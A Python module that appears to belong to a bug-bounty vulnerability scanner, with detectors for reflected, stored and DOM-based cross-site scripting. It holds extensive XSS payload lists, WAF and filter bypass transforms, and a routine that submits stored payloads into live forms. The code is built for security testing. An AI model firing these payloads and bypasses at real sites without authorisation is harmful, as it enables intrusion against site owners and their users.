"""
Enhanced XSS Detector with PortSwigger-style bypasses and context-aware payloads
"""
import asyncio
import re
from typing import List, Dict, Any, Optional, Set
from app.detectors.base import Detector, Endpoint, Finding, ValidationResult, Validator
from app.config import settings


class ReflectedXSSDetector(Detector):
    name = "reflected_xss"
    vuln_class = "Reflected XSS"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
    bugcrowd_vrt_category = "Cross-Site Scripting (XSS) > Reflected XSS"

    # PortSwigger-style payloads organized by context and bypass technique
    CONTEXT_PAYLOADS = {
        "html": {
            "basic": [
                '<script>window.__xss_fired__="xssPoC12345"</script>',
                '<img src=x onerror=window.__xss_fired__="xssPoC12345">',
                '<svg onload=window.__xss_fired__="xssPoC12345">',
                '<details open ontoggle=window.__xss_fired__="xssPoC12345">',
                '<body onfocus=window.__xss_fired__="xssPoC12345" autofocus>',
                '<input onfocus=window.__xss_fired__="xssPoC12345" autofocus>',
                '<select onfocus=window.__xss_fired__="xssPoC12345" autofocus>',
                '<textarea onfocus=window.__xss_fired__="xssPoC12345" autofocus>',
                '<keygen onfocus=window.__xss_fired__="xssPoC12345" autofocus>',
                '<video><source onerror=window.__xss_fired__="xssPoC12345">',
                '<audio><source onerror=window.__xss_fired__="xssPoC12345">',
                '<marquee onstart=window.__xss_fired__="xssPoC12345">',
                '<isindex onfocus=window.__xss_fired__="xssPoC12345" autofocus>',
            ],
            "filter_bypass": [
                '<ScRiPt>window.__xss_fired__="xssPoC12345"</ScRiPt>',
                '<scr<script>ipt>window.__xss_fired__="xssPoC12345"</scr<script>ipt>',
                '<img src=x onerror=window.__xss_fired__="xssPoC12345">',
                '<IMG SRC=X ONERROR=window.__xss_fired__="xssPoC12345">',
                '<svg/onload=window.__xss_fired__="xssPoC12345">',
                '<svg onload=window.__xss_fired__="xssPoC12345"//',
                '<details/open/ontoggle=window.__xss_fired__="xssPoC12345">',
                '<<script>script>window.__xss_fired__="xssPoC12345"</script>',
            ],
            "encoding": [
                '<script>window.__xss_fired__="xssPoC12345"</script>',
                '&#x3C;script&#x3E;window.__xss_fired__="xssPoC12345"&#x3C;/script&#x3E;',
                '&#60;script&#62;window.__xss_fired__="xssPoC12345"&#60;/script&#62;',
                '%3Cscript%3Ewindow.__xss_fired__="xssPoC12345"%3C/script%3E',
            ],
        },
        "attribute": {
            "basic": [
                '" onfocus=window.__xss_fired__="xssPoC12345" autofocus "',
                "' onfocus=window.__xss_fired__='xssPoC12345' autofocus '",
                '" onmouseover=window.__xss_fired__="xssPoC12345" "',
                "' onmouseover=window.__xss_fired__='xssPoC12345' '",
            ],
            "filter_bypass": [
                '" autofocus onfocus=window.__xss_fired__="xssPoC12345" "',
                "' autofocus onfocus=window.__xss_fired__='xssPoC12345' '",
                '" onfocusin=window.__xss_fired__="xssPoC12345" "',
                '" onfocusout=window.__xss_fired__="xssPoC12345" "',
                '" onanimationstart=window.__xss_fired__="xssPoC12345" "',
                '" ontransitionend=window.__xss_fired__="xssPoC12345" "',
            ],
            "encoding": [
                '" onfocus=window.__xss_fired__="xssPoC12345" "',
                '&#x22; onfocus=window.__xss_fired__="xssPoC12345" &#x22;',
                '%22 onfocus=window.__xss_fired__="xssPoC12345" %22',
            ],
        },
        "javascript": {
            "basic": [
                "';window.__xss_fired__='xssPoC12345';//",
                '";window.__xss_fired__="xssPoC12345";//',
                "`;window.__xss_fired__='xssPoC12345';//",
                "'-window.__xss_fired__='xssPoC12345'-'",
                '"-window.__xss_fired__="xssPoC12345"-"',
            ],
            "filter_bypass": [
                "\\';window.__xss_fired__='xssPoC12345';//",
                '\\";window.__xss_fired__="xssPoC12345";//',
                "'+window.__xss_fired__='xssPoC12345'+'",
                '"+window.__xss_fired__="xssPoC12345"+"',
                "${window.__xss_fired__='xssPoC12345'}",
                "#{window.__xss_fired__='xssPoC12345'}",
            ],
            "encoding": [
                "\\x27;window.__xss_fired__='xssPoC12345';//",
                "\\u0027;window.__xss_fired__='xssPoC12345';//",
            ],
        },
        "url": {
            "basic": [
                "javascript:window.__xss_fired__='xssPoC12345'",
                "data:text/html,<script>window.__xss_fired__='xssPoC12345'</script>",
                "vbscript:window.__xss_fired__='xssPoC12345'",
            ],
            "filter_bypass": [
                "java\u0009script:window.__xss_fired__='xssPoC12345'",
                "java\u000ascript:window.__xss_fired__='xssPoC12345'",
                "java\u000dscript:window.__xss_fired__='xssPoC12345'",
                "javascript:window.__xss_fired__='xssPoC12345'//",
                "data:text/html;base64,PHNjcmlwdD53aW5kb3cuX194c3NfZmlyZWRfXz0neHNzUG9DMTIzNDUnPC9zY3JpcHQ+",
            ],
        },
    }

    # WAF bypass techniques
    WAF_BYPASSES = [
        # Case variation
        lambda p: p.lower(),
        lambda p: p.upper(),
        lambda p: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)),
        # Double encoding
        lambda p: p.replace('<', '%253C').replace('>', '%253E'),
        # Null byte
        lambda p: p.replace('<', '%00<').replace('>', '%00>'),
        # Comment insertion
        lambda p: p.replace('<script', '<!--><script').replace('</script>', '</script><!--'),
        # Attribute separation
        lambda p: p.replace('onerror=', 'onerror =').replace('onload=', 'onload ='),
    ]

    def __init__(self, http_client, oob_server=None, playwright_browser=None):
        super().__init__(http_client, oob_server, playwright_browser)
        self._tested_payloads: Set[str] = set()

    def applies_to(self, endpoint: Endpoint) -> bool:
        return bool(endpoint.params) and endpoint.method in ("GET", "POST")

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []

        if not self.playwright_browser:
            return findings

        for param in endpoint.params:
            context = self._detect_context(endpoint, param)
            payloads = self._get_payloads_for_context(context)
            
            # Also try WAF bypasses if basic payloads fail
            all_payloads = payloads["basic"] + payloads.get("filter_bypass", []) + payloads.get("encoding", [])
            
            for payload in all_payloads:
                if payload in self._tested_payloads:
                    continue
                self._tested_payloads.add(payload)
                
                finding = await self._test_payload(endpoint, param, payload, context)
                if finding:
                    findings.append(finding)
                    break
            
            # If no finding, try WAF bypass variants of successful patterns
            if not findings:
                for base_payload in payloads["basic"][:3]:  # Try first 3 basic payloads with bypasses
                    for bypass in self.WAF_BYPASSES:
                        try:
                            variant = bypass(base_payload)
                            if variant not in self._tested_payloads:
                                self._tested_payloads.add(variant)
                                finding = await self._test_payload(endpoint, param, variant, context)
                                if finding:
                                    findings.append(finding)
                                    break
                        except:
                            pass
                    if findings:
                        break

        return findings

    def _get_payloads_for_context(self, context: str) -> Dict[str, List[str]]:
        return self.CONTEXT_PAYLOADS.get(context, self.CONTEXT_PAYLOADS["html"])

    def _detect_context(self, endpoint: Endpoint, param: str) -> str:
        value = endpoint.get_param_value(param) or ""
        content_type = endpoint.headers.get("content-type", "").lower()
        
        if value.startswith("javascript:") or value.startswith("data:") or value.startswith("vbscript:"):
            return "url"
        if any(c in value for c in "\"'`"):
            return "attribute"
        if any(c in value for c in "<>"):
            return "html"
        if "application/json" in content_type:
            return "javascript"
        return "html"

    async def _test_payload(
        self,
        endpoint: Endpoint,
        param: str,
        payload: str,
        context: str
    ) -> Optional[Finding]:
        marker = "xssPoC12345"
        test_url = endpoint.with_param(param, payload)

        control_resp = await self._fetch_with_browser(endpoint.url)
        test_resp = await self._fetch_with_browser(test_url)

        if not test_resp:
            return None

        validation = Validator.xss_executed(test_resp["page"], marker)
        if validation.confirmed:
            screenshot = await self._capture_screenshot(test_resp["page"])
            return self._make_finding(
                endpoint=endpoint,
                param=param,
                confidence="confirmed",
                evidence={
                    "payload": payload,
                    "context": context,
                    "marker": marker,
                    "request_url": test_url,
                    "response_status": test_resp["status"],
                    "response_headers": dict(test_resp["headers"]),
                    "screenshot": screenshot,
                    "validation": validation.evidence,
                },
                summary=f"Reflected XSS in parameter '{param}' via {context} context",
                description=(
                    f"The parameter '{param}' at {endpoint.url} reflects user input without proper "
                    f"output encoding. An attacker can inject arbitrary JavaScript that executes "
                    f"in a victim's browser when they visit a crafted URL."
                ),
                steps_to_reproduce=(
                    f"1. Navigate to: {test_url}\n"
                    f"2. Observe JavaScript execution (marker '{marker}' set in window.__xss_fired__)\n"
                    f"3. The payload executes in the victim's browser context"
                ),
                impact=(
                    "An attacker can steal session cookies, perform actions on behalf of the user, "
                    "deface the page, or deliver malware via reflected XSS."
                ),
                remediation=(
                    "Implement context-aware output encoding. For HTML context, encode < > \" ' &. "
                    "For JavaScript context, use JSON encoding. For URL context, use URL encoding. "
                    "Implement a strong Content Security Policy (CSP) as defense-in-depth."
                ),
            )

        # Also check for reflection without execution (potential XSS)
        reflection_check = await self._check_reflection(test_resp, marker)
        if reflection_check:
            return self._make_finding(
                endpoint=endpoint,
                param=param,
                confidence="suspected",
                evidence={
                    "payload": payload,
                    "context": context,
                    "marker": marker,
                    "request_url": test_url,
                    "reflection": reflection_check,
                    "note": "Payload reflected but not executed - may be blocked by CSP or encoding",
                },
                summary=f"Potential Reflected XSS in parameter '{param}' - payload reflected",
                description=(
                    f"The parameter '{param}' reflects user input. The payload was found in the response "
                    f"but did not execute. This may indicate encoding/CSP protection or a false positive."
                ),
                steps_to_reproduce=(
                    f"1. Navigate to: {test_url}\n"
                    f"2. Search for '{marker}' in response\n"
                    f"3. Verify if payload is encoded or blocked by CSP"
                ),
                impact="If encoding/CSP is bypassed, could lead to XSS.",
                remediation="Verify context-aware encoding is applied. Check CSP policy. Use CSP nonces/hashes.",
            )

        return None

    async def _check_reflection(self, test_resp: Dict, marker: str) -> Optional[Dict]:
        """Check if payload is reflected in response"""
        body = test_resp.get("body", "")
        if marker in body:
            # Find position and context
            idx = body.find(marker)
            return {
                "position": idx,
                "context_before": body[max(0, idx-100):idx],
                "context_after": body[idx:idx+100],
                "encoded": "<" in body[idx-10:idx] or "&#x3C;" in body[idx-10:idx],
            }
        return None

    async def _fetch_with_browser(self, url: str) -> Optional[Dict[str, Any]]:
        try:
            page = await self.playwright_browser.new_page()
            # Disable CSP for testing (but note it in evidence)
            await page.add_init_script("""
                window.__xss_fired__ = null;
                // Try to bypass CSP
                try {
                    const meta = document.createElement('meta');
                    meta.httpEquiv = 'Content-Security-Policy';
                    meta.content = "script-src 'unsafe-inline' 'unsafe-eval' *;";
                    document.head.appendChild(meta);
                } catch(e) {}
            """)
            response = await page.goto(url, wait_until="networkidle", timeout=settings.REQUEST_TIMEOUT * 1000)
            return {
                "page": page,
                "status": response.status if response else 0,
                "headers": dict(response.headers) if response else {},
                "body": await page.content(),
            }
        except Exception:
            return None

    async def _capture_screenshot(self, page) -> str:
        import os
        from datetime import datetime
        screenshot_dir = settings.DATA_DIR / "screenshots"
        screenshot_dir.mkdir(exist_ok=True)
        filename = f"xss_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.png"
        path = screenshot_dir / filename
        await page.screenshot(path=str(path), full_page=True)
        return str(path)


class StoredXSSDetector(Detector):
    name = "stored_xss"
    vuln_class = "Stored XSS"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N"
    bugcrowd_vrt_category = "Cross-Site Scripting (XSS) > Stored XSS"

    STORED_PAYLOADS = [
        '<script>window.__stored_xss_fired__="storedXSSPoC12345"</script>',
        '<img src=x onerror=window.__stored_xss_fired__="storedXSSPoC12345">',
        '<svg onload=window.__stored_xss_fired__="storedXSSPoC12345">',
        '<details open ontoggle=window.__stored_xss_fired__="storedXSSPoC12345">',
        '"><script>window.__stored_xss_fired__="storedXSSPoC12345"</script>',
        "'><script>window.__stored_xss_fired__='storedXSSPoC12345'</script>",
        "<iframe src=javascript:window.__stored_xss_fired__='storedXSSPoC12345'>",
        "<object data=javascript:window.__stored_xss_fired__='storedXSSPoC12345'>",
    ]

    def applies_to(self, endpoint: Endpoint) -> bool:
        return endpoint.method in ("POST", "PUT", "PATCH") and bool(endpoint.params)

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []
        if not self.playwright_browser:
            return findings

        marker = "storedXSSPoC12345"

        for param in endpoint.params:
            for payload in self.STORED_PAYLOADS:
                finding = await self._test_stored_xss(endpoint, param, payload, marker)
                if finding:
                    findings.append(finding)
                    break

        return findings

    async def _test_stored_xss(self, endpoint: Endpoint, param: str, payload: str, marker: str) -> Optional[Finding]:
        submit_url = endpoint.url
        form_data = {param: payload}
        for p in endpoint.params:
            if p != param:
                form_data[p] = endpoint.get_param_value(p) or "test"

        try:
            page = await self.playwright_browser.new_page()
            await page.goto(endpoint.url, wait_until="networkidle")
            await page.wait_for_load_state("networkidle")

            for key, value in form_data.items():
                await page.fill(f'[name="{key}"]', value)

            await page.click('button[type="submit"], input[type="submit"]')
            await page.wait_for_load_state("networkidle")

            fired = await page.evaluate(f'() => window.__stored_xss_fired__ === "{marker}"')
            if fired:
                screenshot = await self._capture_screenshot(page)
                return self._make_finding(
                    endpoint=endpoint,
                    param=param,
                    confidence="confirmed",
                    evidence={
                        "payload": payload,
                        "marker": marker,
                        "submit_url": submit_url,
                        "screenshot": screenshot,
                    },
                    summary=f"Stored XSS in parameter '{param}' - payload persisted and executed",
                    description=(
                        f"The parameter '{param}' stores user input without sanitization and later "
                        f"renders it unsafely. The injected JavaScript executes when any user views "
                        f"the affected page."
                    ),
                    steps_to_reproduce=(
                        f"1. Submit payload via {param} at {submit_url}\n"
                        f"2. Navigate to the page where the input is displayed\n"
                        f"3. Observe JavaScript execution"
                    ),
                    impact=(
                        "Stored XSS affects all users viewing the compromised page. Can lead to "
                        "account takeover, data theft, or malware distribution."
                    ),
                    remediation=(
                        "Sanitize all user input on storage and implement context-aware output "
                        "encoding on render. Use a CSP with strict script-src directives."
                    ),
                )
        except Exception:
            pass
        return None

    async def _capture_screenshot(self, page) -> str:
        import os
        from datetime import datetime
        screenshot_dir = settings.DATA_DIR / "screenshots"
        screenshot_dir.mkdir(exist_ok=True)
        filename = f"stored_xss_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.png"
        path = screenshot_dir / filename
        await page.screenshot(path=str(path), full_page=True)
        return str(path)


class DOMXSSDetector(Detector):
    name = "dom_xss"
    vuln_class = "DOM-based XSS"
    cvss_vector_template = "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
    bugcrowd_vrt_category = "Cross-Site Scripting (XSS) > DOM-based XSS"

    SOURCES = [
        "location.href", "location.hash", "location.search",
        "document.URL", "document.documentURI", "document.URLUnencoded",
        "window.name", "document.referrer",
        "history.pushState", "history.replaceState",
        "localStorage", "sessionStorage", "indexedDB",
    ]

    SINKS = [
        "innerHTML", "outerHTML", "document.write", "document.writeln",
        "eval", "setTimeout", "setInterval", "Function",
        "insertAdjacentHTML", "html", "append", "prepend",
        "before", "after", "replaceWith", "outerText",
        "textContent", "innerText", "value",
        "src", "href", "action", "data",
        "onload", "onerror", "onclick", "onmouseover",
    ]

    DANGEROUS_PATTERNS = [
        r'eval\s*\(',
        r'new\s+Function\s*\(',
        r'setTimeout\s*\(\s*[\'"]',
        r'setInterval\s*\(\s*[\'"]',
        r'execScript\s*\(',
        r'innerHTML\s*=',
        r'outerHTML\s*=',
        r'document\.write\s*\(',
        r'document\.writeln\s*\(',
        r'insertAdjacentHTML\s*\(',
        r'\.html\s*\(',
        r'\.append\s*\(',
        r'\.prepend\s*\(',
    ]

    def applies_to(self, endpoint: Endpoint) -> bool:
        return True

    async def run(self, endpoint: Endpoint) -> List[Finding]:
        findings = []
        if not self.playwright_browser:
            return findings

        try:
            page = await self.playwright_browser.new_page()
            
            # Instrument the page for taint tracking
            await page.add_init_script("""
                window.__dom_xss_sources = {};
                window.__dom_xss_sinks = {};
                window.__dom_xss_fired__ = false;
                
                // Hook sources
                const sources = ['href', 'hash', 'search', 'href', 'documentURI', 'URLUnencoded', 'name', 'referrer'];
                sources.forEach(src => {
                    try {
                        Object.defineProperty(location, src, {
                            get: function() {
                                window.__dom_xss_sources['location.' + src] = this['_' + src] || this[src];
                                return this['_' + src] || this[src];
                            },
                            set: function(v) {
                                window.__dom_xss_sources['location.' + src] = v;
                                this['_' + src] = v;
                            }
                        });
                    } catch(e) {}
                });
                
                // Hook document.URL
                try {
                    Object.defineProperty(document, 'URL', {
                        get: function() {
                            window.__dom_xss_sources['document.URL'] = this._URL || this.URL;
                            return this._URL || this.URL;
                        },
                        set: function(v) {
                            window.__dom_xss_sources['document.URL'] = v;
                            this._URL = v;
                        }
                    });
                } catch(e) {}
                
                // Hook sinks
                const sinks = ['innerHTML', 'outerHTML', 'write', 'writeln', 'eval'];
                sinks.forEach(sink => {
                    const original = HTMLElement.prototype.__lookupSetter__(sink) || 
                                    Object.getOwnPropertyDescriptor(HTMLElement.prototype, sink)?.set;
                    if (original) {
                        Object.defineProperty(HTMLElement.prototype, sink, {
                            set: function(v) {
                                window.__dom_xss_sinks[sink] = v;
                                window.__dom_xss_fired__ = true;
                                return original.call(this, v);
                            }
                        });
                    }
                });
                
                // Hook document.write
                const origWrite = document.write;
                document.write = function(v) {
                    window.__dom_xss_sinks['document.write'] = v;
                    window.__dom_xss_fired__ = true;
                    return origWrite.apply(this, arguments);
                };
            """)

            await page.goto(endpoint.url, wait_until="networkidle")

            # Inject test payload into each source and check if it reaches sinks
            test_payload = "domXssPoC12345"
            
            for source in ["location.hash", "location.search", "document.referrer"]:
                test_url = endpoint.url
                if source == "location.hash":
                    test_url += f"#{test_payload}"
                elif source == "location.search":
                    separator = "&" if "?" in test_url else "?"
                    test_url += f"{separator}test={test_payload}"
                
                await page.goto(test_url, wait_until="networkidle")
                await page.wait_for_timeout(500)
                
                # Check if payload reached any sink
                results = await page.evaluate("""
                    () => {
                        const results = [];
                        const sinks = ['innerHTML', 'outerHTML', 'document.write', 'eval', 'Function'];
                        sinks.forEach(sink => {
                            if (window.__dom_xss_sinks && window.__dom_xss_sinks[sink]) {
                                if (window.__dom_xss_sinks[sink].includes('domXssPoC12345')) {
                                    results.push({source: '%s', sink: sink, value: window.__dom_xss_sinks[sink]});
                                }
                            }
                        });
                        return results;
                    }
                """ % source)

                for result in results:
                    findings.append(self._make_finding(
                        endpoint=endpoint,
                        param=result["source"],
                        confidence="confirmed",
                        evidence={
                            "source": result["source"],
                            "sink": result["sink"],
                            "taint_value": result["value"],
                        },
                        summary=f"DOM XSS: {result['source']} flows to {result['sink']}",
                        description=(
                            f"User-controlled data from {result['source']} reaches the dangerous sink "
                            f"{result['sink']} without sanitization, allowing DOM-based XSS."
                        ),
                        steps_to_reproduce=(
                            f"1. Navigate to {endpoint.url}?{result['source']}=<payload>\n"
                            f"2. Observe JavaScript execution via {result['sink']}"
                        ),
                        impact="DOM XSS allows client-side code execution without server interaction.",
                        remediation="Avoid using dangerous sinks with user-controlled data. Use textContent instead of innerHTML. Validate and sanitize all client-side inputs.",
                    ))

        except Exception:
            pass

        return findings